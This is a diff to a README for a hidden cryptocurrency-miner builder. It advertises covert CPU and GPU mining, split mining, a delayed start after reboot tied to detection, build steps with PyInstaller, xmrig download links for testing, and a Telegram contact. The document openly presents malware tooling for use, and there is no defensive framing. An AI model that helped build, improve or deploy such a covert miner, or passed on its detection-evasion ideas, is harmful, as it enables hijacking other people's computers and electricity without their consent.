@@ -16,7 +16,9 @@ Features
 
  - Hidden CPU Mining + GPU Mining with selective miner inclusion
 
- - GUI Builder (WOW I know)
+ - Start only after reboot pc (increase detects) 
+ 
+ - GUI Builder (RU / EN Language)
 
  - Split Mining (To split the mining, you must specify a mining percentage (1–99) in the second configuration file; the default is 50/50.)
 
@@ -44,6 +46,9 @@ python -m pip install PySide6 PyInstaller pyaes
 ### Create Builder
 python -m PyInstaller --noconfirm --clean --onefile --windowed --name "MyApp" --icon "icon.ico" --add-data "icon.ico:." "main.py"
 Builder creating in dist
+
+### Test settings
+You can copy settings from builder windows and start default xmrig.exe with settings https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip (if u test gpu need download cuda.dll https://github.com/xmrig/xmrig-cuda)
 
 ### Issues
 If you notice a bug or any other issue that isn't installation, please feel free to find me at t.me/corvusminer, or open an issue on github.
